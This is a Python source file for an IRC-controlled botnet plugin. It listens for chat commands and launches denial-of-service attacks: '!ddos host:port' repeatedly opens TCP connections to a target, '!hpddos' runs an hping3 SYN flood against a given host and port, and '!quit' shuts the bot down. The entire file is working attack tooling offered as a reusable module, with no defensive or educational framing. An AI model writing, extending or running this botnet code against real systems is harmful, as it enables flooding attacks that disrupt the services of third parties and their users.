import os
import socket
import subprocess


from .. import BaseResponder


class Toast(BaseResponder):
	config_namespace = 'botnet'
	config_name = 'toast'

	def get_all_commands(self):
		rw = super(Toast, self).get_all_commands()
		try:
			for command in self.config['module_config'][self.config_namespace][self.config_name].keys():
				rw.append(command)
		except Exception as e:
			print(e)
		return rw

	def handle_privmsg(self, msg):
		if self.is_command(msg):
			command = (str(msg).split('!')[-1])
			print('>>> COMMAND RECEIVED: %s' % command)
			cmd, *params = command.split()

			# !ddos 192.168.1.66:80
			if cmd == 'ddos' and params:
				self.respond(msg, command + ' ok')
				print(params)
				host, port = params[0].split(':')
				self.dudos(sock=msg, host=host, port=int(port))
			# !hpddos 192.168.1.66
			elif cmd == 'hpddos' and params:
				host, port = params[0].split(':')
				#hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood 192.168.100.83
				print(subprocess.check_output(['hping3', '-c', '10000', '-d', '120', '-S', '-w', '64', '-p', port, '--flood', host])) #sudo?
			elif cmd == 'quit':
				self.respond(msg, command + ' ok')
				self.respond(msg, 'Bye!')
				exit()
			else:
				self.respond(msg, 'no such command')

	def dudos(self, host='127.0.0.1', port=8080, times=10000, sock=None):
		print('Dudos in progress...')
		self.respond(sock, 'Dudos in progress...')
		for _ in range(times):
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			try:
				sock.connect((host, port))
				sock.send(b'hello')
				sock.close()
			except Exception as e:
				print(e)
				break


mod = Toast
